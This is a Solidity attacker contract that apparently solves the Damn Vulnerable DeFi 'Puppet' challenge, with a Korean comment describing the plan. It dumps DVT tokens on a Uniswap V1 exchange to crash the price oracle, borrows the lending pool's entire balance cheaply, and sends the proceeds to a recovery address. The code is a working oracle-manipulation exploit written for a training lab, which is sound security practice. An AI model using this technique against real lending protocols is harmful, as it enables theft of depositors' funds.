// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract PuppetAttacker {
    constructor(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address recovery,
        IUniswapV1Exchange exchange,
        DamnValuableToken token,
        PuppetPool lendingPool
    ) payable {

        // 돌파구: 주어진 모든 DVT 토큰을 거래소에서 매도하면 DVT 토큰 가격이 폭락함
        // => PuppetPool 탈탈 털기 가능
        token.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v, r, s
        );
        token.transferFrom(
            msg.sender,
            address(this),
            token.balanceOf(msg.sender)
        );
        token.approve(address(exchange), type(uint256).max);
        exchange.tokenToEthSwapInput(token.balanceOf(address(this)), 1, type(uint256).max);
        lendingPool.borrow {
            value: msg.value
        }(
            token.balanceOf(address(lendingPool)),
            address(this)
        );

        token.transfer(recovery, token.balanceOf(address(this)));
        recovery.call{ value: address(this).balance }("");
    }
}